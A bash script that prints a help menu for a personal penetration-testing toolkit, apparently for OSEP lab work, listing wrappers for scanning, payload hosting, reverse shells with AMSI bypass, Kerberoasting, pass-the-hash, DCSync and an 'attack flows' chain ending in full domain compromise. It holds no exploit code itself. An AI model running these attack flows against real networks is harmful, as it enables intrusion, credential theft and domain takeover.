#!/bin/bash

BOLD='\033[1m'
RED='\033[31m'
GREEN='\033[32m'
BLUE='\033[34m'
YELLOW='\033[33m'
CYAN='\033[36m'
NC='\033[0m'

echo ""
echo -e "${BOLD}${YELLOW}╔══════════════════════════════════════╗${NC}"
echo -e "${BOLD}${YELLOW}║              TOOLKIT                 ║${NC}"
echo -e "${BOLD}${YELLOW}╚══════════════════════════════════════╝${NC}"
echo ""

# ── aunmap ──────────────────────────────
echo -e "${BOLD}${CYAN}aunmap${NC} — Auto Nmap Scanner"
echo -e "  ${GREEN}aunmap <ip>${NC}                  # single target"
echo -e "  ${GREEN}aunmap <ips.txt>${NC}             # multiple targets (parallel)"
echo -e "  ${GREEN}aunmap <ip> --udp${NC}            # + UDP top-100 scan"
echo -e "  ${GREEN}aunmap <ips.txt> --udp${NC}       # multiple + UDP"
echo ""
echo -e "  Output → ${BLUE}./nmap/${NC} (auto-created)"
echo -e "  Resume → skip IP if ${BLUE}nmap/All_<ip>.txt${NC} exists"
echo -e "  Summary saved → ${BLUE}nmap/summary.txt${NC}"
echo ""

# ── serve ────────────────────────────────
echo -e "${BOLD}${CYAN}serve${NC} — HTTP File Server"
echo -e "  ${GREEN}serve${NC}                        # current dir, port 80"
echo -e "  ${GREEN}serve 8080${NC}                   # current dir, port 8080"
echo -e "  ${GREEN}serve linux${NC}                  # linux tools dir (from ~/.servepaths)"
echo -e "  ${GREEN}serve windows${NC}                # windows tools dir"
echo -e "  ${GREEN}serve linux 8080${NC}             # linux tools, port 8080"
echo -e "  ${GREEN}serve --upload${NC}               # + file upload, HTTP"
echo -e "  ${GREEN}serve --upload --ssl${NC}         # + file upload, HTTPS (self-signed)"
echo -e "  ${GREEN}serve --upload 8080${NC}          # + file upload, port 8080"
echo -e "  ${GREEN}serve --upload --ssl 8080${NC}    # + file upload, HTTPS, port 8080"
echo ""
echo -e "  Config → ${BLUE}~/.servepaths${NC} (set LINUX_TOOLS / WINDOWS_TOOLS paths)"
echo ""

# ── loot ─────────────────────────────────
echo -e "${BOLD}${CYAN}loot${NC} — File Transfer Payload Generator"
echo -e "  ${GREEN}loot <file_name> <output> [port]${NC}"
echo -e "  ${GREEN}loot nc64.exe nc.exe${NC}         # port 80 default"
echo -e "  ${GREEN}loot linpeas.sh lp.sh 8080${NC}"
echo ""
echo -e "  Generates:"
echo -e "  ${BLUE}Windows:${NC} certutil, iwr, iwr encoded, wget (PS), smb"
echo -e "  ${BLUE}Linux:${NC}   wget, curl"
echo -e "  Auto-detect IP from tun0 → fallback eth0"
echo ""

# ── OSEP scripts ─────────────────────────
echo -e "${BOLD}${YELLOW}── OSEP ──────────────────────────────────${NC}"
echo ""

echo -e "${BOLD}${CYAN}smbenum${NC} — SMB Enumeration (nxc)"
echo -e "  ${GREEN}smbenum <ip>${NC}                 # null session"
echo -e "  ${GREEN}smbenum <ip> <user> <pass>${NC}   # with creds"
echo ""

echo -e "${BOLD}${CYAN}adenum${NC} — AD Enumeration"
echo -e "  ${GREEN}adenum <dc_ip> <domain> <user> <pass>${NC}"
echo -e "  Runs: Kerberoast + AS-REP roast + BloodHound"
echo -e "  Output → ${BLUE}./hashes/${NC} and ${BLUE}./bloodhound/${NC}"
echo ""

echo -e "${BOLD}${CYAN}crack${NC} — Hash Cracker (auto-detect)"
echo -e "  ${GREEN}crack <hash_file>${NC}            # rockyou + best64 default"
echo -e "  ${GREEN}crack <hash_file> <wordlist>${NC}"
echo -e "  Detects: Kerberoast, AS-REP, NTLM, NetNTLMv2, DCC2, Linux shadow, bcrypt"
echo ""

echo -e "${BOLD}${CYAN}spray${NC} — Credential/Hash Spray"
echo -e "  ${GREEN}spray <target> <user> <pass>${NC}              # all protocols"
echo -e "  ${GREEN}spray <target> <user> <hash> --local-auth${NC} # PTH local"
echo -e "  ${GREEN}spray <target> <user> <pass> --smb --winrm${NC}# specific protocols"
echo ""
echo -e "  ${BLUE}Local auth hint:${NC}"
echo -e "  ${BLUE}  Hash from SAM dump  → --local-auth  (local account)${NC}"
echo -e "  ${BLUE}  Hash from NTDS/DCSync → no flag     (domain account)${NC}"
echo -e "  Protocols: --smb --winrm --mssql --ldap --rdp"
echo ""

echo -e "${BOLD}${CYAN}lapsread${NC} — LAPS + GPP Password Dump"
echo -e "  ${GREEN}lapsread <dc_ip> <domain> <user> <pass>${NC}"
echo -e "  LAPS → local admin passwords per machine"
echo -e "  GPP  → cached domain passwords from SYSVOL"
echo ""

echo -e "${BOLD}${CYAN}adcsenum${NC} — ADCS Vulnerability Enum"
echo -e "  ${GREEN}adcsenum <dc_ip> <domain> <user> <pass>${NC}"
echo -e "  Finds: ESC1, ESC4, ESC8 + other vuln templates"
echo -e "  Prints: ready-to-use exploit commands per ESC type"
echo ""

echo -e "${BOLD}${CYAN}ligolo${NC} — Ligolo-ng Tunnel Setup"
echo -e "  ${GREEN}ligolo <kali_ip> <port> <internal_subnet>${NC}"
echo -e "  ${GREEN}ligolo 10.10.14.5 11601 172.16.1.0/24${NC}"
echo ""
echo -e "  Auto: tun interface + route + print victim command + start proxy"
echo -e "  ${BLUE}internal_subnet${NC} → from 'ipconfig'/'ip a' on victim"
echo -e "  After agent connects: ${GREEN}session${NC} → ${GREEN}start${NC} in ligolo prompt"
echo ""

echo -e "${BOLD}${CYAN}dcsync${NC} — DCSync Hash Dump"
echo -e "  ${GREEN}dcsync <dc_ip> <domain> <user> <pass|hash>${NC}"
echo -e "  Runs: nxc --ntds → fallback impacket-secretsdump"
echo -e "  Output → ${BLUE}./hashes/ntds_raw.txt${NC} + ${BLUE}ntds_nt.txt${NC}"
echo -e "  Next:  crack + spray"
echo ""

echo -e "${BOLD}${CYAN}pth${NC} — Pass-the-Hash (auto tool selector)"
echo -e "  ${GREEN}pth <target> <user> <hash>${NC}                 # single IP"
echo -e "  ${GREEN}pth <cidr> <user> <hash>${NC}                   # subnet sweep"
echo -e "  ${GREEN}pth 10.10.10.5 admin <hash> --local-auth${NC}   # local account"
echo -e "  Auto: 5985→evil-winrm, 445→psexec, 135→wmiexec"
echo -e "  ${BLUE}Hash from SAM → --local-auth | Hash from NTDS → no flag${NC}"
echo ""

echo -e "${BOLD}${CYAN}mssqlshell${NC} — MSSQL Attack Shell"
echo -e "  ${GREEN}mssqlshell <target> <user> <pass>${NC}          # interactive"
echo -e "  ${GREEN}mssqlshell <target> sa pass whoami${NC}         # exec cmd"
echo -e "  ${GREEN}mssqlshell <target> admin <hash>${NC}           # PTH"
echo -e "  ${GREEN}mssqlshell <target> user pass --windows-auth${NC}"
echo -e "  Auto: validate → enable xp_cmdshell → shell/exec"
echo ""

echo -e "${BOLD}${CYAN}msfshell${NC} — MSF Multi/Handler"
echo -e "  ${GREEN}msfshell <lhost> <lport> [platform]${NC}"
echo -e "  ${GREEN}msfshell 10.10.14.5 4444${NC}            # windows x64 meterpreter"
echo -e "  ${GREEN}msfshell 10.10.14.5 4444 linux${NC}      # linux meterpreter"
echo -e "  ${GREEN}msfshell 10.10.14.5 4444 ps1${NC}        # powershell"
echo ""

echo -e "${BOLD}${CYAN}genpayload${NC} — Msfvenom Payload Generator"
echo -e "  ${GREEN}genpayload <lhost> <lport> [platform]${NC}"
echo -e "  ${GREEN}genpayload 10.10.14.5 4444${NC}          # windows: exe, dll, ps1, raw"
echo -e "  ${GREEN}genpayload 10.10.14.5 4444 linux${NC}    # linux: elf, raw"
echo -e "  ${GREEN}genpayload 10.10.14.5 4444 exe${NC}      # exe only"
echo -e "  Output → ${BLUE}./payloads/${NC}"
echo ""

echo -e "${BOLD}${CYAN}hoaxshell${NC} — Obfuscated PS Reverse Shell (AMSI bypass)"
echo -e "  ${GREEN}hoaxshell <lhost>${NC}                    # HTTP, port 8080"
echo -e "  ${GREEN}hoaxshell <lhost> 443 --ssl${NC}         # HTTPS"
echo -e "  ${GREEN}hoaxshell <lhost> 9001${NC}              # custom port"
echo -e "  Auto-start listener + print PS one-liner for victim"
echo -e "  Needs: /opt/hoaxshell or ~/tools/hoaxshell"
echo ""

echo -e "${BOLD}${CYAN}qhelp${NC} — Quick Cheatsheet Reference"
echo -e "  ${GREEN}qhelp${NC}                        # list all topics"
echo -e "  ${GREEN}qhelp kerberoast${NC}             # → cheatsheet file + section + script"
echo -e "  ${GREEN}qhelp mimikatz${NC}               # → cheatsheet file + section"
echo -e "  Topics: nmap smb ldap adcs dcsync kerberoast asrep relay"
echo -e "           pth privesc potato ligolo chisel msfvenom amsi ..."
echo ""

echo -e "${YELLOW}══════════════════════════════════════════${NC}"
echo ""
echo -e "${BOLD}${YELLOW}╔══════════════════════════════════════╗${NC}"
echo -e "${BOLD}${YELLOW}║           ATTACK FLOWS               ║${NC}"
echo -e "${BOLD}${YELLOW}╚══════════════════════════════════════╝${NC}"
echo ""

echo -e "${BOLD}${CYAN}── External → Foothold ─────────────────────────────────────${NC}"
echo -e "  ${GREEN}aunmap <ip>${NC}                      scan"
echo -e "  ${GREEN}smbenum <ip>${NC}                     null session enum"
echo -e "  ${GREEN}spray <ip> users.txt pass${NC}         password spray"
echo -e "  ${GREEN}hoaxshell / genpayload${NC}            generate payload"
echo -e "  ${GREEN}serve${NC}                             host payload"
echo -e "  ${YELLOW}→ WIN: shell on host${NC}"
echo ""

echo -e "${BOLD}${CYAN}── Foothold → Local Admin ──────────────────────────────────${NC}"
echo -e "  ${GREEN}qhelp privesc${NC}  /  ${GREEN}qhelp privesc-win${NC}   enum + exploit"
echo -e "  ${GREEN}qhelp potato${NC}                      SeImpersonate → SYSTEM"
echo -e "  ${GREEN}qhelp sudo / suid${NC}                 Linux privesc"
echo -e "  ${YELLOW}→ WIN: SYSTEM / root${NC}"
echo ""

echo -e "${BOLD}${CYAN}── Local Admin → Creds ─────────────────────────────────────${NC}"
echo -e "  ${GREEN}qhelp mimikatz${NC}                    dump LSASS (cleartext + NTLM)"
echo -e "  ${GREEN}qhelp lsass${NC}                       offline dump (procdump/comsvcs)"
echo -e "  ${GREEN}qhelp sam${NC}                         SAM dump (local hashes)"
echo -e "  ${GREEN}lapsread <dc> <domain> <u> <p>${NC}    LAPS + GPP passwords"
echo -e "  ${YELLOW}→ WIN: NTLM hash / cleartext creds${NC}"
echo ""

echo -e "${BOLD}${CYAN}── Creds → Lateral Movement ────────────────────────────────${NC}"
echo -e "  ${GREEN}pth <target> <user> <hash>${NC}        PTH → auto-pick tool"
echo -e "  ${GREEN}spray <subnet> <user> <hash>${NC}      validate hash across subnet"
echo -e "  ${GREEN}qhelp winrm / wmi / rdp${NC}           manual lateral options"
echo -e "  ${YELLOW}→ WIN: shell on new host${NC}"
echo ""

echo -e "${BOLD}${CYAN}── Domain Enum → DA ────────────────────────────────────────${NC}"
echo -e "  ${GREEN}adenum <dc> <domain> <u> <p>${NC}      kerberoast + asrep + bloodhound"
echo -e "  ${GREEN}crack hashes/kerberoast.txt${NC}        crack tickets"
echo -e "  ${GREEN}qhelp bloodhound${NC}                   cypher queries → find path"
echo -e "  ${GREEN}qhelp dacl / delegation / rbcd${NC}     ACL abuse paths"
echo -e "  ${GREEN}adcsenum <dc> <domain> <u> <p>${NC}     ESC1/ESC4/ESC8"
echo -e "  ${YELLOW}→ WIN: Domain Admin / DA hash${NC}"
echo ""

echo -e "${BOLD}${CYAN}── DA → Domain Pwned ───────────────────────────────────────${NC}"
echo -e "  ${GREEN}dcsync <dc> <domain> <u> <p>${NC}       dump all NTDS hashes"
echo -e "  ${GREEN}crack hashes/ntds_nt.txt${NC}            crack DA hashes"
echo -e "  ${GREEN}pth <subnet> administrator <hash>${NC}   PTH sweep entire network"
echo -e "  ${GREEN}qhelp golden${NC}                        golden ticket → persistence"
echo -e "  ${YELLOW}→ WIN: full domain compromise${NC}"
echo ""

echo -e "${BOLD}${CYAN}── Pivoting (internal network) ─────────────────────────────${NC}"
echo -e "  ${GREEN}ligolo <kali_ip> <port> <subnet>${NC}   tunnel via ligolo-ng"
echo -e "  ${GREEN}qhelp chisel / ssh${NC}                 alt tunneling"
echo -e "  ${YELLOW}After tunnel: run all scripts targeting internal IPs directly${NC}"
echo ""

echo -e "${YELLOW}══════════════════════════════════════════${NC}"
